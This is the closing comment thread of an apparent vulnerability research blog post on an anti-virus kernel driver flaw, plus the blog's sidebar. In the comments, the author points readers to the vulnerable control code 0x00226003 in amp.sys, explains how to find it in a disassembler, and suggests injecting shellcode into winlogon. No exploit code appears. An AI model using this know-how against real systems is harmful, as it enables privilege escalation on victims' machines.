    Oh yes, thanks. But can you help me with “SeDebugPrivilege”. What offset?

    Kind regards,
15. ![](https://secure.gravatar.com/avatar/f6306376486bff7a746a72d6dd054e36?s=40&d=mm&r=g) **[Parvez](http://www.greyhathacker.net)** says:
    [February 12, 2018 at 5:02 pm](https://www.greyhathacker.net/?p=1006#comment-13578)

    The SeDebugPrivilege is already enabled in this exploit, what you can do it use a previous exploit of mine which uses shellcode being injected in the winlogon process.
17. ![](https://secure.gravatar.com/avatar/7f487584938dc71e10c99a2714adcffd?s=40&d=mm&r=g) **mppo** says:
    [July 17, 2018 at 9:07 am](https://www.greyhathacker.net/?p=1006#comment-13648)

    Thanks for nice write up. I want to study this case, so I’ve downloaded the link

    <http://download.iolo.net/sm/15/pro/en/iolo/trial/SystemMechanicPro_15.5.0.61.exe>.

    And opened amp.sys file with IDA pro, but I could not find the code related to ctl code 0x00226003. How can I find it?
19. ![](https://secure.gravatar.com/avatar/f6306376486bff7a746a72d6dd054e36?s=40&d=mm&r=g) **[Parvez](http://www.greyhathacker.net)** says:
    [July 17, 2018 at 4:50 pm](https://www.greyhathacker.net/?p=1006#comment-13649)

    Best just do a text search for 226003 and only one entry will be listed
21. ![](https://secure.gravatar.com/avatar/7f487584938dc71e10c99a2714adcffd?s=40&d=mm&r=g) **mppo** says:
    [July 18, 2018 at 2:33 am](https://www.greyhathacker.net/?p=1006#comment-13650)

    Thanks! I found with its hex byte ’03 60 22′ in IDA search and reached vulnerable function.

### Leave a Reply

Your email address will not be published. Required fields are marked \*

Comment \*

Name \*

Email \*

Website

#### Recent Posts

* [Dokany/Google Drive File Stream Kernel Stack-based Buffer Overflow Vulnerability](https://www.greyhathacker.net/?p=1041)
* [Exploiting STOPzilla AntiMalware Arbitrary Write Vulnerability using SeCreateTokenPrivilege](https://www.greyhathacker.net/?p=1025)
* [Exploiting System Shield AntiVirus Arbitrary Write Vulnerability using SeTakeOwnershipPrivilege](https://www.greyhathacker.net/?p=1006)
* [IKARUS anti.virus and its 9 exploitable kernel vulnerabilities](https://www.greyhathacker.net/?p=995)
* [Exploiting Vir.IT eXplorer Anti-Virus Arbitrary Write Vulnerability](https://www.greyhathacker.net/?p=990)
#### Categories

* [All](https://www.greyhathacker.net/?cat=18)
* [Bugs](https://www.greyhathacker.net/?cat=8)
* [Exploits](https://www.greyhathacker.net/?cat=7)
* [Malware](https://www.greyhathacker.net/?cat=5)
* [Mitigation](https://www.greyhathacker.net/?cat=40)
* [Other](https://www.greyhathacker.net/?cat=34)
* [Vulnerabilities](https://www.greyhathacker.net/?cat=6)
#### Tags

[ActionScript](https://www.greyhathacker.net/?tag=actionscript)
[ActiveX](https://www.greyhathacker.net/?tag=activex)
[Adobe](https://www.greyhathacker.net/?tag=adobe)
[Anti-Rootkit](https://www.greyhathacker.net/?tag=anti-rootkit)
[ASLR](https://www.greyhathacker.net/?tag=aslr)
[Autorun](https://www.greyhathacker.net/?tag=autorun)
[BHO](https://www.greyhathacker.net/?tag=bho)
[BlazeDVD](https://www.greyhathacker.net/?tag=blazedvd)
[Download and Execute](https://www.greyhathacker.net/?tag=download-and-execute)
[Elevate](https://www.greyhathacker.net/?tag=elevate)
[EMET](https://www.greyhathacker.net/?tag=emet)
[FakeAV](https://www.greyhathacker.net/?tag=fakeav)
[heapspray](https://www.greyhathacker.net/?tag=heapspray)
[Hidden](https://www.greyhathacker.net/?tag=hidden)
[Hijack](https://www.greyhathacker.net/?tag=hijack)
[IrfanView](https://www.greyhathacker.net/?tag=irfanview)
[Java](https://www.greyhathacker.net/?tag=java)
[Kernel](https://www.greyhathacker.net/?tag=kernel)
[Macros](https://www.greyhathacker.net/?tag=macros)
[McAfee](https://www.greyhathacker.net/?tag=mcafee)
[MSI](https://www.greyhathacker.net/?tag=msi)
[MSWord](https://www.greyhathacker.net/?tag=msword)
[PGP](https://www.greyhathacker.net/?tag=pgp)
[pif](https://www.greyhathacker.net/?tag=pif)
[RemoteExec](https://www.greyhathacker.net/?tag=remoteexec)
[Return to Libc](https://www.greyhathacker.net/?tag=return-to-libc)
[ROP](https://www.greyhathacker.net/?tag=rop)
[Sandbox](https://www.greyhathacker.net/?tag=sandbox)
[Skype](https://www.greyhathacker.net/?tag=skype)
[SureThing](https://www.greyhathacker.net/?tag=surething)
[Symantec](https://www.greyhathacker.net/?tag=symantec)
[trailing](https://www.greyhathacker.net/?tag=trailing)
[UAC](https://www.greyhathacker.net/?tag=uac)
[URI](https://www.greyhathacker.net/?tag=uri)
[Vista](https://www.greyhathacker.net/?tag=vista)
#### Archives

* [January 2019](https://www.greyhathacker.net/?m=201901) (1)
* [September 2018](https://www.greyhathacker.net/?m=201809) (1)
* [January 2018](https://www.greyhathacker.net/?m=201801) (1)
* [November 2017](https://www.greyhathacker.net/?m=201711) (2)
* [September 2016](https://www.greyhathacker.net/?m=201609) (1)
* [December 2015](https://www.greyhathacker.net/?m=201512) (2)
* [July 2015](https://www.greyhathacker.net/?m=201507) (1)
* [January 2015](https://www.greyhathacker.net/?m=201501) (1)
* [December 2014](https://www.greyhathacker.net/?m=201412) (1)
* [June 2014](https://www.greyhathacker.net/?m=201406) (1)
* [January 2014](https://www.greyhathacker.net/?m=201401) (1)
* [November 2013](https://www.greyhathacker.net/?m=201311) (1)
* [September 2013](https://www.greyhathacker.net/?m=201309) (1)
* [February 2013](https://www.greyhathacker.net/?m=201302) (1)
* [December 2012](https://www.greyhathacker.net/?m=201212) (1)
* [August 2012](https://www.greyhathacker.net/?m=201208) (1)
* [June 2012](https://www.greyhathacker.net/?m=201206) (1)
* [February 2012](https://www.greyhathacker.net/?m=201202) (1)
* [January 2012](https://www.greyhathacker.net/?m=201201) (1)
* [December 2011](https://www.greyhathacker.net/?m=201112) (1)
* [November 2011](https://www.greyhathacker.net/?m=201111) (1)
* [August 2011](https://www.greyhathacker.net/?m=201108) (2)
* [July 2011](https://www.greyhathacker.net/?m=201107) (1)
* [April 2011](https://www.greyhathacker.net/?m=201104) (1)
* [March 2011](https://www.greyhathacker.net/?m=201103) (1)
* [October 2010](https://www.greyhathacker.net/?m=201010) (3)
* [June 2010](https://www.greyhathacker.net/?m=201006) (1)
* [May 2010](https://www.greyhathacker.net/?m=201005) (1)
* [March 2010](https://www.greyhathacker.net/?m=201003) (2)
* [February 2010](https://www.greyhathacker.net/?m=201002) (1)
* [December 2009](https://www.greyhathacker.net/?m=200912) (1)
* [September 2009](https://www.greyhathacker.net/?m=200909) (1)
* [May 2009](https://www.greyhathacker.net/?m=200905) (1)
* [April 2009](https://www.greyhathacker.net/?m=200904) (1)
* [September 2008](https://www.greyhathacker.net/?m=200809) (1)
* [November 2007](https://www.greyhathacker.net/?m=200711) (2)
#### Meta

* [Log in](https://www.greyhathacker.net/wp-login.php)
* [Entries feed](https://www.greyhathacker.net/?feed=rss2)
* [Comments feed](https://www.greyhathacker.net/?feed=comments-rss2)
* [WordPress.org](https://wordpress.org/)

Proudly powered by [WordPress](http://wordpress.org/ "Semantic Personal Publishing Platform")  ·
Theme: Suits by [Theme Weaver](http://www.themeweaver.net/ "Theme Developer")


